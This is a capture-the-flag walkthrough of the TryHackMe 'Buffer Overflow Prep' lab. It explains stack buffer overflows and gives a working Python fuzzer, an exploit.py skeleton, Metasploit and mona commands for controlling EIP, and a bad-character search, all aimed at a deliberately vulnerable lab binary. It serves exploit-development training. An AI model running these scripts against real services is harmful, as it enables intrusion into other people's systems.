---
title: Buffer Overflow Prep
published: true
---

[https://tryhackme.com/room/bufferoverflowprep](https://tryhackme.com/room/bufferoverflowprep)

Practicing stack based buffer overflows!

**What is Buffer Overflow**

Buffers are memory storage regions that temporarily hold data while being transfered to one location from another. The buffer overflow occurs when the volume of data exceeds the storage capacity of the memory buffer, and as a result the program attempting to write the data to the buffer, overwrites adjacent memory locations.

![](/assets/buffer-overflow-cyber-attack.png)

For example, a buffer for log-in credentials may be designed to expect username and password inputs of 8 bytes, so if a transaction involves an input of 10 bytes (that is, 2 bytes more than expected), the program may write the excess data past the buffer boundary.

Buffer overflows can affect all types of software. They typically result from malformed inputs or failure to allocate enough space for the buffer. If the transaction overwrites executable code, it can cause the program to behave unpredictably and generate incorrect results, memory access errors, or crashes.

**What is a Buffer Overflow Attack**

Attackers exploit buffer overflow issues by overwriting the memory of an application. This changes the execution path of the program, triggering a response that damages files or exposes private information. For example, an attacker may introduce extra code, sending new instructions to the application to gain access to IT systems.

If attackers know the memory layout of a program, they can intentionally feed input that the buffer cannot store, and overwrite areas that hold executable code, replacing it with their own code. For example, an attacker can overwrite a pointer (an object that points to another area in memory) and point it to an exploit payload, to gain control over the program.

More Information: [https://www.imperva.com/learn/application-security/buffer-overflow/](https://www.imperva.com/learn/application-security/buffer-overflow/).

* * *

## [](#header-2)Task 1 - Deploying VM

- Room is a 32-bit Windows 7 VM with Immunity Debugger and Putty preinstalled. Windows Firewall and Defender have been disables so easiar to write exploits.
- admin:password are credentials
- ``xfreerdp /u:admin /p:password /cert:ignore /v:10.10.164.214 /dynamic-resolution or /workarea`` to connect
- Desktop has a folder "vulnerable-apps", full of well binaries that are vulnerable to simple stack based buffer overflows.
- the SLMail installer
- the brainpan binary
- the vulnserver binary
- customer writted "oscp" binary that contains 10 buffer overflows each with a differ EIP offset and a set of baschars 

- handy buffer overflow guide: https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

* * * 

## [](#header-2)Task 2 - oscp.exe - OVERFLOW1

1. setup Immunity Debugger and open oscp.exe
2. nc 10.10.183.109 1337 to connect and use ``HELP``, then ``OVERFLOW1 test`` to complete and then terminate.

### [](#header-3)Mona Configuration

1. Set up ``c:\mona`` directory run ``!mona config -set workingfolder c:\mona\%p`` in the bottom of Immunity Debugger

### [](#header-3)Fuzzing

1. create file on kali called ``fuzzer.py`` with the following (make sure ip is target ip):

```shell
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.183.109"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

2. run ``fuzzer.py``. This will send increasingly long strings of A's. If the fuzzer crashes the server with one of the strings it will exit with an error message. Lets make a note of the lagest number of bytes sent. **Fuzzing crashed at 2000 bytes**

### [](#header-3)Crash Replication & Controlling EIP

1. Create another file ``exploit.py`` with the following:
```shell
import socket

ip = "10.10.183.109"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
2. Run the following command to generate a cyclic pattern of a length 400 bytes longer than the string that crashed the server.
- ``/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400``
3. we copy the output and place it into the payload variable of the ``exploit.py`` script 
4. reopen the oscp.exe again with Immunity Debugger and click red play icon to get it running. We will have to do this every time before we run the ``exploit.py``, which we will do multiple times with incremental modifications.
5. run ``exploit.py`` with python, the script should crash the oscp server again.
6. In Immunity Debugger, run this mona command with the same distance as the pattern we created ``!mona findmsp -distance 2400`` this will display a log window with the output of the command.
![](/assets/buffer-overflow01.png)
7. Update our exploit.py script and set the offset variable to this value, set the payload variable to an empty string again, set the retn variable to "BBBB".
8. Open oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (42424242) if we did everything correctly.
![](/assets/buffer-overflow02.png)

### [](#header-3)Finding Bad Characters

1. Generate a byterray using mona tha will exclude the null byte by default ``!mona bytearray -b "\x00"``. Note the location of the byterray.bin file that is generated ``c:\mona\oscp\byterray.bin``.
2. Generate a string of bad chars that is identical to the byterray, with the following script. 
```shell
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```
3. Copy the badchars and update our exploit.py script and set the payload variable to the badchars.
4. make note of the address to which the ESP register points and use it in the following mona command: ``!mona compare -f c:\mona\oscp\bytearray.bin -a 0196FA30`` 
5. Take a note of the comparison results BadChars and generate a new bytearray in mona.
6. ``!mona bytearray -b "\x00\x01"`` 
7. upload our payload variable in exploit.py and remove the new badchars.
8. restart oscp.exe in Immunity and run exploit.py script again. And repeat the badchar comparison until the results status returns "Unmodified". This indicates no more badchars exist.

##### [](#header-5)Answer the questions below



* * *



